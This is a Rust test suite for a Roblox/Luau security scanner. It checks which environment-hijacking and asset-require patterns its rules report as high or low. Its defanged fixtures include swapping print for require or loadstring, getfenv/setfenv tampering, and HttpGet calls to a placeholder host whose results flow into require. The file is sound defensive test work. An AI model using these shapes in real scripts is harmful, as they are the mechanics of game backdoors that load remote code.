//! Shapes from scanning real games (2026-10-19): ordinary game code and bundled package
//! tests that got high findings. Each relaxed shape has counterparts that must stay
//! reported. Every fixture is a synthetic reduction and defanged: asset IDs are in
//! 999000000000000 to 999999999999999 and every name that is not a Luau or Roblox name
//! starts with `FAKE` or is a plain word. `2147483647` is the largest 32 bit integer,
//! used as the modulus of a random seed, not an asset ID.

use bloxguard_core::analysis::{AnalysisResult, analyze};
use bloxguard_core::finding::{Finding, Severity};
use bloxguard_core::loading::load_source;
use bloxguard_core::model::{Document, Instance, Limits};

/// The message of the check that runs when a call cannot be replayed.
const SUMMARY: &str = "an asset ID is passed to a function that calls require";
/// More calls than the 16 replays one function gets.
const SPAWNS: usize = 20;

fn describe(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| {
            format!(
                "{} {} {:?} line {:?} {} | {}",
                finding.rule_id,
                finding.severity,
                finding.confidence,
                finding.location.line,
                finding.message,
                finding.evidence
            )
        })
        .collect()
}

fn module(name: &str) -> Instance {
    Instance {
        name: name.into(),
        class: "ModuleScript".into(),
        parent: Some(0),
        source: Some("return {}".into()),
        ..Instance::default()
    }
}

/// A folder with the modules the fixtures require and, last, a script with `source`.
fn in_folder(source: &str) -> AnalysisResult {
    let mut instances = vec![Instance {
        name: "FAKE_Root".into(),
        class: "Folder".into(),
        ..Instance::default()
    }];
    for name in ["FAKE_Rng", "FAKE_Wild", "FAKE_Other"] {
        instances.push(module(name));
    }
    instances.push(Instance {
        name: "FAKE_Service".into(),
        class: "ModuleScript".into(),
        parent: Some(0),
        source: Some(source.into()),
        ..Instance::default()
    });
    let script = instances.len() - 1;
    let document = Document {
        input: "FAKE_game.rbxl".into(),
        instances,
        ..Document::default()
    };
    analyze(&document, script, &Limits::default(), &[])
}

/// The same script as a loose file, where `script.Parent` leaves the scanned content.
fn loose(source: &str) -> AnalysisResult {
    let document = load_source(
        source,
        "FAKE_Service.luau",
        "ModuleScript",
        &Limits::default(),
    );
    analyze(&document, 0, &Limits::default(), &[])
}

// ----- BG001: a value passed to a function that only requires local modules ------------

/// The shape of a game's egg spawner: a random generator seeded with
/// `(os.time() * 31) % 2147483647`, whose results are passed to `FAKE_spawn`. That
/// function bumps a counter, so every call is replayed, and connects a callback that
/// calls `onTouch`, whose body is `on_touch`. `prelude` comes before `onTouch`. Each of
/// the `SPAWNS` calls passes `value` with `{i}` replaced by the call number and `{iii}`
/// by the call number in three digits.
fn spawner(prelude: &str, on_touch: &str, value: &str) -> String {
    let mut source = format!(
        "local FAKE_Rng = require(script.Parent.FAKE_Rng)\n\
         local FAKE_Wild = require(script.Parent.FAKE_Wild)\n\
         local rng = FAKE_Rng.new((os.time() * 31) % 2147483647)\n\
         local nextId = 0\n\
         {prelude}\n\
         local function onTouch(kind)\n{on_touch}\nend\n\
         local function FAKE_spawn(kind)\n\
         \tnextId += 1\n\
         \tlocal part = Instance.new(\"Part\")\n\
         \tpart.Touched:Connect(function()\n\
         \t\tonTouch(kind)\n\
         \tend)\n\
         \treturn part\n\
         end\n"
    );
    for call in 1..=SPAWNS {
        let value = value
            .replace("{iii}", &format!("{call:03}"))
            .replace("{i}", &call.to_string());
        source.push_str(&format!("FAKE_spawn({value})\n"));
    }
    source
}

/// What the spawner passes: a value derived from the seed, as in the game, the same with
/// a seed modulus in the fake ID range, and a distinct fake ID on each call.
const VALUES: [&str; 3] = [
    "FAKE_Wild.roll({i}, rng)",
    "FAKE_Wild.roll({i}, FAKE_Rng.new(os.time() % 999000000019901))",
    "999000000019{iii}",
];

/// A lazy `require(script.Parent.FAKE_Other)` in the callback cannot receive the value,
/// so the calls past the replay limit get no BG001. High on `e559083` from the 17th call.
#[test]
fn an_id_passed_to_a_function_that_only_requires_local_modules_is_not_bg001() {
    let on_touch =
        "\tlocal FAKE_Other = require(script.Parent.FAKE_Other)\n\tFAKE_Other.touched(kind)";
    for value in VALUES {
        let source = spawner("", on_touch, value);
        for (label, result) in [("folder", in_folder(&source)), ("loose", loose(&source))] {
            assert!(
                result.findings.iter().all(
                    |finding| finding.rule_id != "BG001" && finding.severity < Severity::Medium
                ),
                "{label} {value}: {:#?}",
                describe(&result.findings)
            );
        }
        // Control: an ID loaded directly in the same script is still reported.
        let direct = format!("{source}require(999000000019050)\n");
        let result = in_folder(&direct);
        let line = direct.lines().count();
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001"
                    && finding.severity == Severity::High
                    && finding.location.line == Some(line)
                    && finding.evidence.contains("999000000019050")),
            "{value} direct: {:#?}",
            describe(&result.findings)
        );
    }
}

/// Counterpart: when the callback's `require` may receive the value, the calls past the
/// replay limit stay high through the summary check. Passes on `e559083` too; it guards
/// the narrowed check.
#[test]
fn an_id_passed_to_a_function_whose_require_may_receive_it_stays_high() {
    let local = "\tlocal FAKE_Other = require(script.Parent.FAKE_Other)\n";
    for (label, prelude, on_touch) in [
        (
            "require of the parameter",
            "",
            "\trequire(kind)".to_string(),
        ),
        (
            "local module or the parameter",
            "",
            "\tlocal FAKE_Other = require(if FAKE_flag then script.Parent.FAKE_Other else kind)"
                .to_string(),
        ),
        (
            "a local module, then a wrapper",
            "local function FAKE_load(id)\n\treturn require(id)\nend",
            format!("{local}\tFAKE_load(kind)"),
        ),
        (
            "a local module, then pcall",
            "",
            format!("{local}\tpcall(require, kind)"),
        ),
        (
            "a module table",
            "",
            "\trequire(FAKE_Wild.modules[kind])".to_string(),
        ),
        (
            "a string path built from the parameter",
            "",
            "\trequire(\"./FAKE_\" .. kind)".to_string(),
        ),
    ] {
        for value in VALUES {
            let source = spawner(prelude, &on_touch, value);
            let result = in_folder(&source);
            let first_summary = source.lines().count() - SPAWNS + 17;
            assert!(
                result
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == "BG001"
                        && finding.severity == Severity::High
                        && finding.message == SUMMARY
                        && finding.location.line >= Some(first_summary)),
                "{label} {value}: {:#?}",
                describe(&result.findings)
            );
        }
    }
}

// ----- BG004: output capture in a bundled package spec ---------------------------------

/// The BG004 findings of a result.
fn bg004(result: &AnalysisResult) -> Vec<&Finding> {
    result
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "BG004")
        .collect()
}

/// A spec that captures output, reduced from the console spec of a polyfill package
/// that Wally installs with its tests. `env` is how the spec names the environment and
/// `key` how it indexes it; `{fn}` stands for the function under test, `{k}` for the key.
fn capture_spec(env: &str, key: &str) -> String {
    let mut source = String::from(
        "return function()\n\tlocal FAKE_printed, FAKE_warned = {}, {}\n\tlocal FAKE_console = require(script.Parent.FAKE_console)\n",
    );
    for (name, list) in [("print", "FAKE_printed"), ("warn", "FAKE_warned")] {
        let environment = env.replace("{fn}", "fn");
        let index = key.replace("{k}", name);
        source.push_str(&format!(
            "\tlocal function FAKE_capture_{name}(...)\n\
             \t\ttable.insert({list}, table.concat({{ ... }}, \" \"))\n\
             \tend\n\
             \tlocal function FAKE_with_{name}(fn: (...any) -> ...any, ...)\n\
             \t\tlocal saved = {environment}{index}\n\
             \t\t{environment}{index} = FAKE_capture_{name}\n\
             \t\tfn(...)\n\
             \t\t{environment}{index} = saved\n\
             \tend\n\
             \tFAKE_with_{name}(FAKE_console.log, \"FAKE %d\", 99)\n\
             \tFAKE_with_{name}(FAKE_console.log, \"FAKE %s\", \"FAKE\")\n"
        ));
    }
    source.push_str("end\n");
    source
}

/// The save, the swap and the restore of `print` and `warn` are low: six findings, each
/// naming its key. High on `e559083`, where every place that bundles the package failed
/// CI at the default threshold.
#[test]
fn bg004_output_capture_in_a_package_spec_is_low() {
    for (env, key) in [
        ("getfenv({fn})", ".{k}"),
        ("getfenv({fn})", "[\"{k}\"]"),
        ("getfenv()", ".{k}"),
        ("getfenv(1)", ".{k}"),
    ] {
        let source = capture_spec(env, key);
        let result = loose(&source);
        let findings = bg004(&result);
        assert!(
            findings.len() == 6
                && findings
                    .iter()
                    .all(|finding| finding.severity == Severity::Low)
                && findings
                    .iter()
                    .filter(|finding| finding.evidence.ends_with("[name: print]"))
                    .count()
                    == 3
                && findings
                    .iter()
                    .filter(|finding| finding.evidence.ends_with("[name: warn]"))
                    .count()
                    == 3,
            "{env} {key}: {:#?}",
            describe(&result.findings)
        );
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.severity < Severity::Medium),
            "{env} {key}: {:#?}",
            describe(&result.findings)
        );
    }
    // Control: a TestEZ spec that reads its runner's `it` stays low too.
    let result = loose("local it = getfenv().it\nit(\"FAKE\", function() end)");
    assert!(
        bg004(&result)
            .iter()
            .all(|finding| finding.severity == Severity::Low
                && finding.evidence.ends_with("[name: it]")),
        "{:#?}",
        describe(&result.findings)
    );
}

/// Counterpart: every other read or write of an output function through an environment
/// stays high, and so does any other key. Passes on `e559083` too; it guards the narrow
/// rule. Each case names what a looser rule would let through.
#[test]
fn bg004_other_output_function_uses_stay_high() {
    let capture = "local function FAKE_capture(...) end\n";
    for (label, source) in [
        (
            "a builtin written, then called",
            "getfenv().print = require\nprint(999000000019101)".to_string(),
        ),
        (
            "loadstring written",
            "local function f(fn) getfenv(fn).warn = loadstring end".to_string(),
        ),
        (
            "print written back as the global",
            "local function f(fn) getfenv(fn).print = print end".to_string(),
        ),
        (
            "the environment stored",
            "local function f(fn) local e = getfenv(fn); e.print = e.require end".to_string(),
        ),
        (
            "a computed key",
            format!("{capture}local function f(fn, k) getfenv(fn)[k] = FAKE_capture end"),
        ),
        (
            "a read passed on",
            "local function f(fn) FAKE_call(getfenv(fn).print) end".to_string(),
        ),
        (
            "a saved read passed on",
            "local function f(fn) local p = getfenv(fn).print\nFAKE_call(p) end".to_string(),
        ),
        (
            "a saved read never put back",
            "local function f(fn) local p = getfenv(fn).print end".to_string(),
        ),
        (
            "a saved read returned",
            "local function f(fn) local p = getfenv(fn).print\nreturn p end".to_string(),
        ),
        (
            "a saved read restored and called",
            "local function f(fn) local p = getfenv(fn).print\ngetfenv(fn).print = p\np(999000000019102) end"
                .to_string(),
        ),
        (
            "a saved local assigned again",
            "local function f(fn) local p = getfenv(fn).print\np = FAKE_other\ngetfenv(fn).print = p end"
                .to_string(),
        ),
        (
            "restored into another environment",
            "local function f(a, b) local p = getfenv(a).print\ngetfenv(b).print = p end"
                .to_string(),
        ),
        (
            "restored after the environment local changed",
            "local function f(fn) local p = getfenv(fn).print\nfn = FAKE_other\ngetfenv(fn).print = p end"
                .to_string(),
        ),
        (
            "restored under another key",
            "local function f(fn) local p = getfenv(fn).print\ngetfenv(fn).warn = p end"
                .to_string(),
        ),
        (
            "an environment from a call",
            "local function f() local p = getfenv(FAKE_get()).print\ngetfenv(FAKE_get()).print = p end"
                .to_string(),
        ),
        (
            "a read that is called",
            "local function f(fn) getfenv(fn).print(999000000019103) end".to_string(),
        ),
        (
            "a replacement that calls require",
            "local function FAKE_capture(x) require(x) end\nlocal function f(fn) getfenv(fn).print = FAKE_capture end"
                .to_string(),
        ),
        (
            "a replacement that calls loadstring",
            "local function FAKE_capture(x) loadstring(x)() end\nlocal function f(fn) getfenv(fn).warn = FAKE_capture end"
                .to_string(),
        ),
        (
            "a replacement assigned again",
            format!("{capture}FAKE_capture = require\nlocal function f(fn) getfenv(fn).print = FAKE_capture end"),
        ),
        (
            "a replacement declared again",
            format!("{capture}function FAKE_capture() end\nlocal function f(fn) getfenv(fn).print = FAKE_capture end"),
        ),
        (
            "an inline replacement",
            "local function f(fn) getfenv(fn).print = function() end end".to_string(),
        ),
        (
            "a global replacement",
            "local function f(fn) getfenv(fn).print = FAKE_global end".to_string(),
        ),
        (
            "a field replacement",
            "local function f(fn) getfenv(fn).print = FAKE_module.capture end".to_string(),
        ),
        (
            "a cast replacement",
            format!("{capture}local function f(fn) getfenv(fn).print = FAKE_capture :: any end"),
        ),
        (
            "two writes at once",
            format!("{capture}local function f(fn) getfenv(fn).print, getfenv(fn).warn = FAKE_capture, FAKE_capture end"),
        ),
        (
            "a write in a multiple assignment",
            format!("{capture}local function f(fn) getfenv(fn).print, FAKE_other = FAKE_capture, 1 end"),
        ),
        (
            "a compound write",
            "local function f(fn) getfenv(fn).print ..= \"FAKE\" end".to_string(),
        ),
        (
            "another key saved and restored",
            "local function f(fn) local o = getfenv(fn).error\ngetfenv(fn).error = o end"
                .to_string(),
        ),
        (
            "another key replaced",
            format!("{capture}local function f(fn) getfenv(fn).require = FAKE_capture end"),
        ),
        ("setfenv", "local function f(fn) setfenv(fn, {}) end".to_string()),
    ] {
        let result = loose(&source);
        assert!(
            bg004(&result)
                .iter()
                .any(|finding| finding.severity == Severity::High),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

/// A capture spec: `before`, then `FAKE_capture` with `body`, then a helper that saves
/// `key`, swaps in `FAKE_capture`, calls the function under test and restores the key,
/// then `after`, then the helper called with `target`.
fn replacement_spec(before: &str, body: &str, after: &str, key: &str, target: &str) -> String {
    format!(
        "{before}\n\
         local function FAKE_capture(...)\n{body}\nend\n\
         local function FAKE_with(fn)\n\
         \tlocal saved = getfenv(fn).{key}\n\
         \tgetfenv(fn).{key} = FAKE_capture\n\
         \tfn()\n\
         \tgetfenv(fn).{key} = saved\n\
         end\n\
         {after}\n\
         FAKE_with({target})\n"
    )
}

/// The BG004 finding on the line that swaps in `FAKE_capture`.
fn replacement_finding<'r>(source: &str, result: &'r AnalysisResult) -> Option<&'r Finding> {
    let line = source
        .lines()
        .position(|line| line.contains("= FAKE_capture"))
        .map(|index| index + 1);
    bg004(result)
        .into_iter()
        .find(|finding| finding.location.line == line)
}

const REMOTE: &str = "function() print(game:HttpGet(\"https://FAKE.example/id\")) end";
const LATER: &str = "later = function(x) return require(x) end";

/// Counterpart: a replacement whose capture may run a function chosen elsewhere stays
/// high, also when that function is nil, a stub or unknown where the capture is
/// defined. Passes on `e559083`; the first rule of `aa2f135` let the shapes from the
/// diff review through.
#[test]
fn bg004_a_replacement_that_may_run_a_function_chosen_elsewhere_stays_high() {
    let http = "function() print(game:GetService(\"HttpService\"):GetAsync(\"https://FAKE.example/id\")) end";
    let json = "function() local H = game:GetService(\"HttpService\") print(H:JSONDecode(H:GetAsync(\"https://FAKE.example/id\")).id) end";
    let named = format!(
        "{LATER}\nlocal function FAKE_target() print(game:HttpGet(\"https://FAKE.example/id\")) end"
    );
    let cases: Vec<(&str, String, &str, String, &str, &str)> = vec![
        // (label, before, body, after, key, target)
        (
            "an upvalue nil at definition",
            "local later".into(),
            "\tlater(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a global declared later",
            String::new(),
            "\tFAKE_later(...)",
            "function FAKE_later(x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a table field assigned later",
            "local FAKE_hooks = {}".into(),
            "\tFAKE_hooks.on(...)",
            "FAKE_hooks.on = function(x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a local function assigned again later",
            "local function later(...) end".into(),
            "\tlater(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a stub upvalue assigned again later",
            "local later = function(...) end".into(),
            "\tlater(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "pcall of a later function",
            "local later".into(),
            "\tpcall(later, ...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "xpcall of a later function",
            "local later".into(),
            "\txpcall(later, warn, ...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "an HttpService payload",
            "local later".into(),
            "\tlater(...)",
            LATER.into(),
            "print",
            http,
        ),
        (
            "a decoded payload",
            "local later".into(),
            "\tlater(...)",
            LATER.into(),
            "print",
            json,
        ),
        (
            "a named function under test",
            "local later".into(),
            "\tlater(...)",
            named.clone(),
            "print",
            "FAKE_target",
        ),
        (
            "warn",
            "local later".into(),
            "\tlater(...)",
            LATER.into(),
            "warn",
            "function() warn(game:HttpGet(\"https://FAKE.example/id\")) end",
        ),
        (
            "a method call",
            "local FAKE_log = {}".into(),
            "\tFAKE_log:write(...)",
            "function FAKE_log:write(x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a call chain",
            "local later\nlocal function FAKE_get() return later end".into(),
            "\tFAKE_get()(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a parenthesized callee",
            "local later".into(),
            "\t(later)(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a local helper that calls a later function",
            "local later\nlocal function FAKE_helper(...) later(...) end".into(),
            "\tFAKE_helper(...)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a nested function that calls a later function",
            "local later\nlocal FAKE_list = {}".into(),
            "\ttable.insert(FAKE_list, function() later() end)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a generic for",
            "local later".into(),
            "\tfor _ in later do end",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "a concatenation metamethod",
            "local FAKE_box".into(),
            "\tlocal _ = FAKE_box .. select(1, ...)",
            "FAKE_box = setmetatable({}, {__concat = function(_, x) return require(x) end})".into(),
            "print",
            REMOTE,
        ),
        (
            "an index metamethod",
            "local FAKE_box".into(),
            "\tlocal _ = FAKE_box[select(1, ...)]",
            "FAKE_box = setmetatable({}, {__index = function(_, k) return require(k) end})".into(),
            "print",
            REMOTE,
        ),
        (
            "a newindex metamethod",
            "local FAKE_box = {}".into(),
            "\tFAKE_box[1] = select(1, ...)",
            "setmetatable(FAKE_box, {__newindex = function(_, _, v) require(v) end})".into(),
            "print",
            REMOTE,
        ),
        (
            "a field of a table from a call",
            "local FAKE_box = FAKE_make()".into(),
            "\tlocal _ = FAKE_box.value",
            String::new(),
            "print",
            REMOTE,
        ),
        ("a table given a metatable later", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "setmetatable(FAKE_box, {__index = function(_, k) return require(k) end})".into(), "print", REMOTE),
        ("a table passed on", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "FAKE_lib.setup(FAKE_box)".into(), "print", REMOTE),
        ("a table aliased", "local FAKE_box = {}".into(), "\tFAKE_box[1] = select(1, ...)", "local FAKE_alias = FAKE_box\nsetmetatable(FAKE_alias, {__newindex = function(_, _, v) require(v) end})".into(), "print", REMOTE),
        ("a table assigned again", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "FAKE_box = setmetatable({}, {__index = function(_, k) return require(k) end})".into(), "print", REMOTE),
        ("a table stored in another table", "local FAKE_box = {}\nlocal FAKE_all = {}".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "table.insert(FAKE_all, FAKE_box)\nsetmetatable(FAKE_all[1], {__index = function(_, k) return require(k) end})".into(), "print", REMOTE),
        ("a method call on the table", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "FAKE_box:setup()".into(), "print", REMOTE),
        ("a table from a changed library", "local FAKE_box = table.pack()".into(), "\tlocal _ = FAKE_box[select(1, ...)]", "table.pack = function() return setmetatable({}, {__index = function(_, k) return require(k) end}) end".into(), "print", REMOTE),
        ("a counter assigned", "local FAKE_box".into(), "\tfor i = 1, select(\"#\", ...) do\n\t\ti = FAKE_box\n\t\tlocal _ = i + 1\n\tend", String::new(), "print", REMOTE),
        ("arithmetic on a value read from a table", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box[1] + select(\"#\", ...)", String::new(), "print", REMOTE),
        ("concatenation of a value read from a table", "local FAKE_box = {}".into(), "\tlocal _ = \"FAKE\" .. FAKE_box[1]", String::new(), "print", REMOTE),
        ("concatenation of a printed value", String::new(), "\tlocal _ = \"FAKE\" .. select(1, ...)", String::new(), "print", REMOTE),
        ("an index of a global table", String::new(), "\tlocal _ = FAKE_G[select(1, ...)]", "setmetatable(FAKE_G, {__index = function(_, k) return require(k) end})".into(), "print", REMOTE),
        ("an index through a field of a plain table", "local FAKE_box = {}".into(), "\tlocal _ = FAKE_box.inner[select(1, ...)]", "FAKE_box.inner = setmetatable({}, {__index = function(_, k) return require(k) end})".into(), "print", REMOTE),        ("a callable table", "local FAKE_mt = {}\nlocal FAKE_proxy = setmetatable({}, FAKE_mt)".into(), "\treturn FAKE_proxy(...)", "FAKE_mt.__call = function(_, x) return require(x) end".into(), "print", REMOTE),
        ("a getfenv alias and a later require", "local later\nlocal FAKE_env = getfenv".into(), "\tlater(...)", "later = require".into(), "print", REMOTE),
        ("an alias of print changed to require", "local FAKE_emit = print".into(), "\tFAKE_emit(...)", "FAKE_emit = require".into(), "print", REMOTE),
        ("an alias changed to loadstring", "local later = tostring".into(), "\tlater(...)", "later = loadstring".into(), "print", REMOTE),
        ("task.spawn of a later function", "local later".into(), "\ttask.spawn(later, ...)", LATER.into(), "print", REMOTE),
        ("coroutine.wrap of a later function", "local later".into(), "\tcoroutine.wrap(later)(...)", LATER.into(), "print", REMOTE),
        ("a local copy of a later function", "local later".into(), "\tlocal copy = later\n\tcopy(...)", LATER.into(), "print", REMOTE),
        (
            "an equality metamethod",
            "local FAKE_box".into(),
            "\tlocal _ = FAKE_box == select(1, ...)",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "a length",
            "local FAKE_box".into(),
            "\tlocal _ = #FAKE_box",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "a unary minus",
            "local FAKE_box".into(),
            "\tlocal _ = -FAKE_box",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "a compound assignment",
            "local FAKE_n = 0".into(),
            "\tFAKE_n += select(\"#\", ...)",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "string.gsub with a callback",
            "local later".into(),
            "\tstring.gsub(tostring(select(1, ...)), \".+\", later)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "table.sort with a comparator",
            "local later\nlocal FAKE_list = {}".into(),
            "\ttable.sort(FAKE_list, later)",
            LATER.into(),
            "print",
            REMOTE,
        ),
        (
            "table.find, which calls __eq",
            "local FAKE_list = {}".into(),
            "\ttable.find(FAKE_list, select(1, ...))",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "a capture global assigned",
            String::new(),
            "\tlocal _ = select(1, ...)",
            "select = function(_, x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a library field written",
            "local FAKE_list = {}".into(),
            "\ttable.insert(FAKE_list, select(1, ...))",
            "table.insert = function(_, x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a library field declared",
            "local FAKE_list = {}".into(),
            "\ttable.insert(FAKE_list, select(1, ...))",
            "function table.insert(_, x) return require(x) end".into(),
            "print",
            REMOTE,
        ),
        (
            "a shadowed library",
            "local table = {insert = function(_, x) return require(x) end}\nlocal FAKE_list = {}"
                .into(),
            "\ttable.insert(FAKE_list, select(1, ...))",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "print passed through",
            String::new(),
            "\tprint(...)",
            String::new(),
            "print",
            REMOTE,
        ),
        (
            "require",
            String::new(),
            "\trequire(...)",
            String::new(),
            "print",
            REMOTE,
        ),
    ];
    let mut lowered = Vec::new();
    for (label, before, body, after, key, target) in &cases {
        let source = replacement_spec(before, body, after, key, target);
        let result = loose(&source);
        if replacement_finding(&source, &result)
            .is_none_or(|finding| finding.severity != Severity::High)
        {
            lowered.push(format!("{label}: {:?}", describe(&result.findings)));
        }
    }
    assert!(
        lowered.is_empty(),
        "{} of {}: {lowered:#?}",
        lowered.len(),
        cases.len()
    );
}

/// Control: a capture that only calls the capture library functions and closed local
/// functions stays low, with the save and the restore.
#[test]
fn bg004_a_closed_replacement_stays_low() {
    let list = "local FAKE_list = {}";
    for (label, before, body, key) in [
        (
            "join and insert",
            list.to_string(),
            "\ttable.insert(FAKE_list, table.concat({ ... }, \" \"))",
            "print",
        ),
        (
            "a closed helper",
            format!(
                "{list}\nlocal function FAKE_join(...) return table.concat({{ ... }}, \" \") end"
            ),
            "\ttable.insert(FAKE_list, FAKE_join(...))",
            "print",
        ),
        (
            "two closed helpers",
            format!(
                "{list}\nlocal function FAKE_first(...) return tostring((select(1, ...))) end\nlocal function FAKE_join(...) return FAKE_first(...) end"
            ),
            "\ttable.insert(FAKE_list, FAKE_join(...))",
            "warn",
        ),
        (
            "formatting",
            list.to_string(),
            "\ttable.insert(FAKE_list, string.format(\"%s %d\", tostring((select(1, ...))), select(\"#\", ...)))",
            "print",
        ),
        (
            "and, or and not",
            list.to_string(),
            "\tlocal first = select(1, ...)\n\tif not first then return end\n\ttable.insert(FAKE_list, first and tostring(first) or \"FAKE\")",
            "warn",
        ),
        (
            "an append to a plain upvalue table",
            "local FAKE_seen = {}".to_string(),
            "\tFAKE_seen[#FAKE_seen + 1] = { ... }",
            "print",
        ),
        (
            "packed values joined in a loop",
            list.to_string(),
            "\tlocal parts = table.pack(...)\n\tlocal line = {}\n\tfor index = 1, parts.n do\n\t\tline[index] = tostring(parts[index])\n\tend\n\ttable.insert(FAKE_list, table.concat(line, \" \"))",
            "warn",
        ),
        (
            "a plain table read and iterated elsewhere",
            "local FAKE_out = {}\nlocal function FAKE_count() return #FAKE_out end\nlocal function FAKE_each() for _, line in FAKE_out do table.insert({}, line) end end".to_string(),
            "\tFAKE_out[#FAKE_out + 1] = \"FAKE \" .. tostring((select(1, ...))) .. \" \" .. select(\"#\", ...)\n\ttable.clear(FAKE_out)",
            "print",
        ),
    ] {
        let source = replacement_spec(&before, body, "", key, "function() end");
        let result = loose(&source);
        let findings = bg004(&result);
        assert!(
            findings.len() == 3
                && findings
                    .iter()
                    .all(|finding| finding.severity == Severity::Low),
            "{label}: {:#?}\n{source}",
            describe(&result.findings)
        );
    }
}
